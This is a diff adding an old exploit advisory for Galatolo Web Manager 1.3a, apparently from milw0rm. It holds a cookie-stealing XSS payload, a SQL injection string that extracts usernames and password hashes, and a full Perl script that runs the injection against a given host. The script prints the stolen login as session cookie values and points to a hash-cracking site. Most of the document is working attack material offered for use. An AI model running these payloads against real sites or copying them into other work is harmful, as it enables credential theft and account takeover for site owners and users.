@@ -1,0 +1,68 @@
+--==+============================================================================+==--
+--==+   Galatolo Web Manager 1.3a <= XSS / Remote SQL Injection Vulnerability    +==--    
+--==+============================================================================+==--
+
+ [*] Discovered By: StAkeR ~ StAkeR@hotmail.it
+ [+] Discovered On: 14 Jul 2008
+ [+] Download: http://gwm.dev-area.org/view.php?id=8
+
+ [*] Vulnerabilities:
+ 
+ [*] XSS <= 1.3a
+ [+] all.php?tag= [Code Javascript]
+ [+] http://site.com/all.php?tag=<script>alert(document.cookie)</script>
+ 
+ [*] SQL (plugin users) 1.3a
+ [+] plugins/users/index.php?id= [Code SQL]
+ [+] -1+union+select+null,concat(user,0x3a,pass),null,concat(user(),0x3a,database(),0x3a,version())+from+users+where+id=1--
+ 
+ [*] Exploit:
+
+ #!/usr/bin/perl 
+ use strict;
+ use LWP::UserAgent;
+
+ my $host = shift;
+ my ($start,$content,@login);
+ my $evilxx = "/plugins/users/index.php?id=-1+union+select+1,concat(0x25,user,0x25,pass),null,null+from+users+where+id=1--";
+
+ if($host =~ /^http:\/\/?/i)
+ {
+   $start = new LWP::UserAgent or die "[+] Unable to connect\n";
+   $start->timeout(1);
+   $start->agent("Mozilla/4.0 (compatible; Lotus-Notes/5.0; Windows-NT)");
+   $content = $start->get($host.$evilxx);
+  
+   if($content->is_success)
+   {
+     if($content->content =~ /%(.+?)%([0-9a-f]{32})/)
+     {
+       push(@login,$1,$2);
+       print "[+] Login:\n";
+       print "[+] Username: $login[0]\n";
+       print "[+] Password: $login[1]\n\n";
+      
+       print "[+] Cookie Session:\n";
+       print "[+] gwm_user = $login[0]\n";
+       print "[+] gwm_pass = $login[1]\n\n";
+      
+       print "[+] Crack Password:\n";
+       print "[+] md5(md5(password)) for crack:\n"; 
+       print "[+] http://passcracking.com\n";
+     }
+     else
+     {
+       print "[+] Exploit Failed\n";
+       print "[+] Site Not Vulnerable\n";
+     }
+   }
+ }
+ else
+ {
+   print "[+] Galatolo Web Manager (plugin users) 1.3 Remote SQL Injection\n";
+   print "[+] Exploit Coded By: StAkeR ~ StAkeR\@hotmail.it\n\n";
+   print "[+] Usage: Perl $0 <host>\n";
+   print "[+] Usage: Perl $0 http://site.com\n";
+ }
+
+# milw0rm.com [2008-07-15]
